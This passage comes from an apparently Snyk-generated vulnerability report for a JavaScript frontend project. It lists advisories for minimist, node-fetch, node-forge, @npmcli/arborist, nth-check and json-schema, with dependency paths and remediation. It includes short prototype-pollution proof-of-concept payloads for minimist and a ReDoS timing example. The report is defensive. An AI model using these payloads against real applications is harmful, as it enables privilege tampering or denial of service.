exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n## Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n## Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n# Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n# Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n# How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n## For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n# Remediation\nUpgrade `json-schema` to version 0.4.0 or higher.\n# References\n- [GitHub Commit](https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1321",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-MINIMIST-2429795",
              "shortDescription": {
                "text": "Low severity - Prototype Pollution vulnerability in minimist"
              },
              "fullDescription": {
                "text": "(CVE-2021-44906) minimist@1.2.5"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: minimist\n* Introduced through: spyros-frontend@1.0.0, awesome-typescript-loader@5.2.1 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › awesome-typescript-loader@5.2.1 › mkdirp@0.5.5 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › d3-dag@0.6.3 › fastpriorityqueue@0.6.4 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › awesome-typescript-loader@5.2.1 › loader-utils@1.4.0 › json5@1.0.1 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › file-loader@6.2.0 › loader-utils@2.0.0 › json5@2.2.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › @babel/core@7.16.12 › json5@2.2.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › tailwindcss@3.0.15 › detective@5.2.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › babel-loader@8.2.3 › loader-utils@1.4.0 › json5@1.0.1 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › babel-core@6.26.3 › babel-register@6.26.0 › mkdirp@0.5.5 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › prettier-plugin-import-sort@0.0.6 › import-sort-parser-babylon@6.0.0 › @babel/core@7.14.3 › json5@2.2.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › jest-puppeteer@6.0.3 › jest-environment-puppeteer@6.0.3 › jest-dev-server@6.0.3 › wait-on@6.0.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › eslint-config-react-app@7.0.0 › eslint-plugin-import@2.25.4 › tsconfig-paths@3.12.0 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › @svgr/webpack@5.5.0 › @svgr/plugin-svgo@5.5.0 › svgo@1.3.2 › mkdirp@0.5.5 › minimist@1.2.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › optimist@0.6.1 › minimist@0.0.10\n# Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\r\n\r\n**Notes:** \r\n\r\n- This vulnerability is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\r\n\r\n- The reason for the different CVSS between CVE-2021-44906 to CVE-2020-7598, is that CVE-2020-7598 can pollute objects, while CVE-2021-44906 can pollute only function.\r\n\r\n\r\n# PoC by Snyk\r\n```js\r\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\r\nconsole.log((function(){}).foo); // bar\r\n```\n\n# Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n## Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n## Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n# Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n# Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n# How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n## For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n# Remediation\nUpgrade `minimist` to version 1.2.6 or higher.\n# References\n- [Fix Commit](https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\n- [GitHub Issue](https://github.com/substack/minimist/issues/164)\n- [Vulnerable Code](https://github.com/substack/minimist/blob/master/index.js#L69)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1321",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-MINIMIST-559764",
              "shortDescription": {
                "text": "Medium severity - Prototype Pollution vulnerability in minimist"
              },
              "fullDescription": {
                "text": "(CVE-2020-7598) minimist@0.0.10"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: minimist\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › optimist@0.6.1 › minimist@0.0.10\n# Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\r\n\r\n# PoC by Snyk\r\n```\r\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\r\nconsole.log(({}).injected0 === 'value0'); // true\r\n\r\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\r\nconsole.log(({}).injected1 === 'value1'); // true\r\n```\n\n# Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n## Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n## Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n# Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n# Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n# How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n## For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n# Remediation\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\n# References\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NODEFETCH-2342118",
              "shortDescription": {
                "text": "Medium severity - Information Exposure vulnerability in node-fetch"
              },
              "fullDescription": {
                "text": "(CVE-2022-0235,CVE-2022-1365) node-fetch@2.6.5"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: node-fetch\n* Introduced through: spyros-frontend@1.0.0, puppeteer@13.1.1 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › puppeteer@13.1.1 › node-fetch@2.6.5\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › react@15.7.0 › fbjs@0.8.17 › isomorphic-fetch@2.2.1 › node-fetch@1.7.3\n* _Introduced through_: spyros-frontend@1.0.0 › react-digraph@8.0.0-beta.7 › html-react-parser@0.6.4 › react-dom-core@0.0.4 › react@15.7.0 › fbjs@0.8.17 › isomorphic-fetch@2.2.1 › node-fetch@1.7.3\n# Overview\n[node-fetch](https://www.npmjs.com/package/node-fetch) is a light-weight module that brings window.fetch to node.js\n\nAffected versions of this package are vulnerable to Information Exposure when fetching a remote url with Cookie, if it get a `Location` response header, it will follow that url and try to fetch that url with provided cookie. This can lead to forwarding secure headers to 3th party.\n# Remediation\nUpgrade `node-fetch` to version 2.6.7, 3.1.1 or higher.\n# References\n- [Github Commit](https://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35)\n- [GitHub Commit](https://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10)\n- [GitHub Commit](https://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60)\n- [GitHub PR](https://github.com/node-fetch/node-fetch/pull/1449)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-200",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NODEFETCH-674311",
              "shortDescription": {
                "text": "Medium severity - Denial of Service vulnerability in node-fetch"
              },
              "fullDescription": {
                "text": "(CVE-2020-15168) node-fetch@1.7.3"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: node-fetch\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › react@15.7.0 › fbjs@0.8.17 › isomorphic-fetch@2.2.1 › node-fetch@1.7.3\n* _Introduced through_: spyros-frontend@1.0.0 › react-digraph@8.0.0-beta.7 › html-react-parser@0.6.4 › react-dom-core@0.0.4 › react@15.7.0 › fbjs@0.8.17 › isomorphic-fetch@2.2.1 › node-fetch@1.7.3\n# Overview\n[node-fetch](https://www.npmjs.com/package/node-fetch) is a light-weight module that brings window.fetch to node.js\n\nAffected versions of this package are vulnerable to Denial of Service. Node Fetch did not honor the `size` option after following a redirect, which means that when a content size was over the limit, a FetchError would never get thrown and the process would end without failure.\n# Remediation\nUpgrade `node-fetch` to version 2.6.1, 3.0.0-beta.9 or higher.\n# References\n- [GitHub Advisory](https://github.com/node-fetch/node-fetch/security/advisories/GHSA-w7rc-rwvf-8q5r)\n- [GitHub Commit](https://github.com/node-fetch/node-fetch/commit/2358a6c2563d1730a0cdaccc197c611949f6a334)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NODEFORGE-2430337",
              "shortDescription": {
                "text": "Medium severity - Improper Verification of Cryptographic Signature vulnerability in node-forge"
              },
              "fullDescription": {
                "text": "(CVE-2022-24773) node-forge@1.2.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: node-forge\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › webpack-dev-server@4.7.3 › selfsigned@2.0.0 › node-forge@1.2.1\n# Overview\n[node-forge](https://github.com/digitalbazaar/forge) is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA's `PKCS#1 v1.5` signature verification code which does not properly check `DigestInfo` for a proper `ASN.1` structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.\n# Remediation\nUpgrade `node-forge` to version 1.3.0 or higher.\n# References\n- [GitHub Commit](https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-347",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NODEFORGE-2430339",
              "shortDescription": {
                "text": "High severity - Improper Verification of Cryptographic Signature vulnerability in node-forge"
              },
              "fullDescription": {
                "text": "(CVE-2022-24772) node-forge@1.2.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: node-forge\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › webpack-dev-server@4.7.3 › selfsigned@2.0.0 › node-forge@1.2.1\n# Overview\n[node-forge](https://github.com/digitalbazaar/forge) is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA's `PKCS#1` v1.5 signature verification code which does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.\n# Remediation\nUpgrade `node-forge` to version 1.3.0 or higher.\n# References\n- [GitHub Commit](https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-347",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NODEFORGE-2430341",
              "shortDescription": {
                "text": "Medium severity - Improper Verification of Cryptographic Signature vulnerability in node-forge"
              },
              "fullDescription": {
                "text": "(CVE-2022-24771) node-forge@1.2.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: node-forge\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › webpack-dev-server@4.7.3 › selfsigned@2.0.0 › node-forge@1.2.1\n# Overview\n[node-forge](https://github.com/digitalbazaar/forge) is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA`s `PKCS#1` v1.5 signature verification code which is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.\n# Remediation\nUpgrade `node-forge` to version 1.3.0 or higher.\n# References\n- [GitHub Commit](https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-347",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NPMCLIARBORIST-1579165",
              "shortDescription": {
                "text": "High severity - Arbitrary File Write vulnerability in @npmcli/arborist"
              },
              "fullDescription": {
                "text": "(CVE-2021-39134) @npmcli/arborist@2.6.2"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: @npmcli/arborist\n* Introduced through: spyros-frontend@1.0.0, npm@7.16.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › @npmcli/arborist@2.6.2\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › libnpmexec@1.2.0 › @npmcli/arborist@2.6.2\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › libnpmfund@1.1.0 › @npmcli/arborist@2.6.2\n# Overview\n[@npmcli/arborist](https://www.npmjs.org/package/@npmcli/arborist) is a Manage node_modules trees\n\nAffected versions of this package are vulnerable to Arbitrary File Write. `@npmcli/arborist` aims to guarantee that package dependency contracts will be met, and the extraction of package contents will always be performed into the expected folder.\r\n\r\nThis is, in part, accomplished by resolving dependency specifiers defined in `package.json` manifests for dependencies with a specific name, and nesting folders to resolve conflicting dependencies.\r\n\r\nWhen multiple dependencies differ only in the case of their name, `Arborist`'s internal data structure sees them as separate items that could coexist within the same level in the `node_modules` hierarchy. However, on case-insensitive file systems (such as macOS and Windows), this is not the case. Combined with a symlink dependency such as `file:/some/path`, this allows an attacker to create a situation in which arbitrary contents could be written to any location on the filesystem.\n# Remediation\nUpgrade `@npmcli/arborist` to version 2.8.2 or higher.\n# References\n- [GitHub Commit](https://github.com/npm/arborist/commit/041a3c710c2a6fbf644fc2c1119f7f0f440ffadd)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-61",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NPMCLIARBORIST-1579181",
              "shortDescription": {
                "text": "High severity - Arbitrary File Write vulnerability in @npmcli/arborist"
              },
              "fullDescription": {
                "text": "(CVE-2021-39135) @npmcli/arborist@2.6.2"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: @npmcli/arborist\n* Introduced through: spyros-frontend@1.0.0, npm@7.16.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › @npmcli/arborist@2.6.2\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › libnpmexec@1.2.0 › @npmcli/arborist@2.6.2\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › libnpmfund@1.1.0 › @npmcli/arborist@2.6.2\n# Overview\n[@npmcli/arborist](https://www.npmjs.org/package/@npmcli/arborist) is a Manage node_modules trees\n\nAffected versions of this package are vulnerable to Arbitrary File Write. `@npmcli/arborist` aims to guarantee that package dependency contracts will be met, and the extraction of package contents will always be performed into the expected folder.\r\n\r\nThis is accomplished by extracting package contents into a project's `node_modules` folder.\r\n\r\nIf the `node_modules` folder of the root project or any of its dependencies is somehow replaced with a symbolic link, it could allow `Arborist` to write package dependencies to any arbitrary location on the file system.\r\n\r\nNote that symbolic links contained within package artifact contents are filtered out, so another means of creating a `node_modules` symbolic link would have to be employed:\r\n1. A preinstall script could replace `node_modules` with a symlink. (This is prevented by using `--ignore-scripts`.)\r\n2. An attacker could supply the target with a git repository, instructing them to run npm install `--ignore-scripts` in the root. This may be successful, because npm install `--ignore-scripts` is typically not capable of making changes outside of the project directory, so it may be deemed safe.\n# Remediation\nUpgrade `@npmcli/arborist` to version 2.8.2 or higher.\n# References\n- [GitHub Commit](https://github.com/npm/arborist/commit/f2b0ceebfe94123f162c3652af46f9c4c473cc36)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-61",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NTHCHECK-1586032",
              "shortDescription": {
                "text": "High severity - Regular Expression Denial of Service (ReDoS) vulnerability in nth-check"
              },
              "fullDescription": {
                "text": "(CVE-2021-3803) nth-check@1.0.2"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: nth-check\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › @svgr/webpack@5.5.0 › @svgr/plugin-svgo@5.5.0 › svgo@1.3.2 › css-select@2.1.0 › nth-check@1.0.2\n# Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when parsing crafted invalid CSS nth-checks, due to the sub-pattern `\\s*(?:([+-]?)\\s*(\\d+))?` in `RE_NTH_ELEMENT` with quantified overlapping adjacency.\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing 